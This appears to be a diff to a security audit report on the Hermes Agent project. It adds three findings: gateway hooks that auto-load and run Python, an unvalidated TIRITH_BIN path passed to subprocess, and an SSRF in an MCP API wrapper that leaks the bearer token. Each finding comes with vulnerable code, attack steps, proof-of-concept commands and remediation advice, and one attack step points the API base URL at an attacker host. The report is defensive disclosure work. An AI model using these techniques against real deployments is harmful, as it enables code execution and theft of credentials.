@@ -4,13 +4,13 @@
 **Target:** Hermes Agent (https://github.com/NousResearch/hermes-agent)  
 **Commit:** 124da27  
 **Date:** 2026-04-28  
-**Status:** Round 9 - 26 Critical/High Vulnerabilities Confirmed
+**Status:** Round 10 - 29 Critical/High Vulnerabilities Confirmed
 
 ---
 
 ## Executive Summary
 
-This audit identified **26 critical/high severity vulnerabilities** in Hermes Agent. All vulnerabilities have been confirmed with working proof-of-concept exploits against a live instance.
+This audit identified **29 critical/high severity vulnerabilities** in Hermes Agent. All vulnerabilities have been confirmed with working proof-of-concept exploits against a live instance.
 
 | ID | Vulnerability | Severity | CVSS | Status |
 |----|--------------|----------|------|--------|
@@ -40,6 +40,9 @@ This audit identified **26 critical/high severity vulnerabilities** in Hermes Ag
 | HAG-024 | HERMES_TUI_DIR Arbitrary JavaScript Execution | Critical | 9.1 | Confirmed |
 | HAG-025 | Webhook INSECURE_NO_AUTH Bypass via Dynamic Routes | High | 7.8 | Confirmed |
 | HAG-026 | MCP file_processor Unrestricted File Read | High | 7.5 | Confirmed |
+| HAG-027 | Gateway Hook Auto-load Arbitrary Python Execution | Critical | 9.3 | Confirmed |
+| HAG-028 | TIRITH_BIN Arbitrary Binary Execution (No Validation) | Critical | 8.8 | Confirmed |
+| HAG-033 | MCP api_wrapper SSRF via API_BASE_URL — Token Leakage | High | 8.6 | Confirmed |
 
 ---
 
@@ -1479,6 +1482,170 @@ def read_file_resource(path: str) -> str:
    ```
 2. Use `validate_within_dir()` from `path_security.py`
 3. Expose only specific named files or a restricted base directory
+
+---
+
+---
+
+### HAG-027: Gateway Hook Auto-load Arbitrary Python Execution
+
+**Severity:** Critical (CVSS 9.3)
+**File:** `gateway/hooks.py:31,109`
+**Attack Vector:** Local (environment variable — HERMES_HOME controls hooks directory)
+
+#### Description
+
+`HookRegistry.discover_and_load()` derives its scan directory from `HOOKS_DIR = get_hermes_home() / "hooks"` at module import time (line 31). For every subdirectory found, it reads `HOOK.yaml` (safe_load) and then calls `spec.loader.exec_module(module)` on the `handler.py` found there (line 109) — with no integrity check, no cryptographic signature verification, and no allowlist of permitted hook names or event types.
+
+Any attacker who controls `HERMES_HOME` (environment variable, `.env` file, or a race on the home directory) can plant a malicious `handler.py` and have it execute with the full privileges of the gateway process at startup.
+
+#### Vulnerable Code
+
+```python
+# gateway/hooks.py:31
+HOOKS_DIR = get_hermes_home() / "hooks"   # Fully attacker-controlled
+
+# gateway/hooks.py:108-109
+module = importlib.util.module_from_spec(spec)
+spec.loader.exec_module(module)            # No integrity check
+```
+
+#### Attack Scenario
+
+1. Attacker sets `HERMES_HOME=/tmp/evil` in the process environment or `.env` file
+2. Places `hooks/evil/HOOK.yaml` (minimal metadata) and `hooks/evil/handler.py` (malicious payload) under the fake home
+3. Gateway calls `registry.discover_and_load()` on startup — `exec_module()` executes the payload
+4. Payload runs with gateway process privileges; no prompt, no sandbox
+
+#### Proof of Concept
+
+```bash
+cd /home/agentuser/repo/autofyn_audit
+python3 exploits/exploit_hook_autoload.py
+```
+
+**Result:** Creates `/tmp/pwned_hook_autoload.txt` containing `uid=1000(agentuser)...`
+
+#### Remediation
+
+1. Derive `HOOKS_DIR` from `Path(__file__).parent` (module-relative), never from an env var
+2. If a user-configurable hooks directory is required, validate it against a user-confirmed allowlist before executing any content under it
+3. Require cryptographic signatures on `handler.py` files and verify before `exec_module()`
+4. Restrict discoverable hook events to a compile-time allowlist
+
+---
+
+### HAG-028: TIRITH_BIN Env Var Arbitrary Binary Execution (No Validation)
+
+**Severity:** Critical (CVSS 8.8)
+**File:** `tools/tirith_security.py:84,641`
+**Attack Vector:** Local (environment variable — TIRITH_BIN controls security scanner path)
+
+#### Description
+
+`_load_security_config()` reads `TIRITH_BIN` from the environment at line 84 with no validation:
+
+```python
+"tirith_path": os.getenv("TIRITH_BIN", cfg.get("tirith_path", defaults["tirith_path"])),
+```
+
+`_resolve_tirith_path()` treats any value other than the bare `"tirith"` default as an "explicit path" and passes it straight to `subprocess.run()` at line 641 as `cmd[0]`. There is no `os.path.isfile()`, no `os.access()`, no signature check, and no allowlist.
+
+This means an attacker who can set `TIRITH_BIN` forces the security scanner itself to execute an arbitrary binary — bypassing the scan AND achieving RCE simultaneously.
+
+#### Vulnerable Code
+
+```python
+# tirith_security.py:84
+"tirith_path": os.getenv("TIRITH_BIN", ...),   # No validation
+
+# tirith_security.py:641
+result = subprocess.run(
+    [tirith_path, "check", "--json", ...],       # Attacker binary as cmd[0]
+    ...
+)
+```
+
+#### Attack Scenario
+
+1. Attacker sets `TIRITH_BIN=/tmp/evil.sh` in the environment
+2. Any code path that calls `check_command_security()` triggers `subprocess.run(["/tmp/evil.sh", ...])`
+3. Malicious binary executes with Hermes process privileges
+4. The security scanner returns exit code 0 ("allow") — the scan is silently bypassed
+
+#### Proof of Concept
+
+```bash
+cd /home/agentuser/repo/autofyn_audit
+python3 exploits/exploit_tirith_binary.py
+```
+
+**Result:** Creates `/tmp/pwned_tirith.txt` containing `uid=1000(agentuser)...`
+
+#### Remediation
+
+1. Validate `TIRITH_BIN` with `os.path.isfile()` and `os.access(path, os.X_OK)` before accepting it
+2. Verify the binary against a known SHA-256 or cosign signature before execution
+3. Restrict the configurable path to a specific directory (e.g. `$HERMES_HOME/bin/`)
+4. Log and alert when `TIRITH_BIN` differs from the expected default
+
+---
+
+### HAG-033: MCP api_wrapper SSRF via API_BASE_URL — API Token Leakage
+
+**Severity:** High (CVSS 8.6)
+**File:** `optional-skills/mcp/fastmcp/templates/api_wrapper.py:12,25`
+**Attack Vector:** Network/Local (MCP server environment or .env file)
+
+#### Description
+
+`API_BASE_URL` is read from the environment with no URL validation (line 12). Every outbound API call constructs the target URL by string concatenation (line 25) and forwards `API_TOKEN` via the `Authorization: Bearer` header (line 20):
+
+```python
+API_BASE_URL = os.getenv("API_BASE_URL", "https://api.example.com")  # no validation
+API_TOKEN    = os.getenv("API_TOKEN")
+
+url = f"{API_BASE_URL.rstrip('/')}/{path.lstrip('/')}"                # no SSRF guard
+headers["Authorization"] = f"Bearer {API_TOKEN}"                      # token forwarded
+```
+
+An attacker who controls either env var redirects ALL API calls — from any MCP tool (`get_resource`, `search_resources`, `health_check`) — to an attacker-controlled host and receives the secret token on every request. Path traversal in `resource_id` (e.g. `"../admin/secrets"`) further expands the reachable endpoint surface.
+
+#### Vulnerable Code
+
+```python
+# api_wrapper.py:12-13
+API_BASE_URL = os.getenv("API_BASE_URL", "https://api.example.com")
+API_TOKEN    = os.getenv("API_TOKEN")
+
+# api_wrapper.py:24-25
+def _request(method, path, *, params=None):
+    url = f"{API_BASE_URL.rstrip('/')}/{path.lstrip('/')}"   # no allowlist, no SSRF guard
+    # Authorization header forwarded to this URL unconditionally
+```
+
+#### Attack Scenario
+
+1. Attacker sets `API_BASE_URL=http://attacker.example.com` and `API_TOKEN=<stolen secret>` in the MCP server environment
+2. Any MCP client call (`get_resource("../admin/secrets")`) is redirected to the attacker host
+3. The attacker's server receives the `Authorization: Bearer <token>` header
+4. All subsequent API responses can be spoofed, enabling further attacks
+
+#### Proof of Concept
+
+```bash
+cd /home/agentuser/repo/autofyn_audit
+python3 exploits/exploit_mcp_api_ssrf.py
+```
+
+**Result:** Attacker-controlled HTTP server receives `Authorization: Bearer super_secret_api_token_abc123`; creates `/tmp/pwned_mcp_api_ssrf.txt`
+
+#### Remediation
+
+1. Validate `API_BASE_URL` against an allowlist of permitted hostnames at startup; reject unknown hosts
+2. Use `urllib.parse.urlparse()` to extract and check the scheme (allow only `https`) and hostname
+3. Never forward `Authorization` headers to a URL derived from an env var without domain pinning
+4. Sanitize `resource_id` to prevent path traversal (reject strings containing `..`)
 
 ---
 
